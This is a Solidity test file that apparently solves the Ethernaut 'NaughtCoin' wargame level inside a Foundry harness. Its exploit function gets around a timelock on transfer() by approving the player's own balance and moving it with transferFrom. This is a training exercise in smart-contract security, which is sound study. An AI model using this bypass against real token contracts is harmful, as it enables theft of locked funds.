// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/NaughtCoin.sol";
import "src/levels/NaughtCoinFactory.sol";

contract TestNaughtCoin is BaseTest {
    NaughtCoin private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new NaughtCoinFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = NaughtCoin(levelAddress);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */
        vm.startPrank(player);

        // new wallet setup
        address payable tempUser = utilities.getNextUserAddress();
        vm.deal(tempUser, 1 ether);

        uint256 playerBalance = level.balanceOf(player);

        level.approve(player, playerBalance);

        level.transferFrom(player, tempUser, playerBalance);

        vm.stopPrank();
    }
}
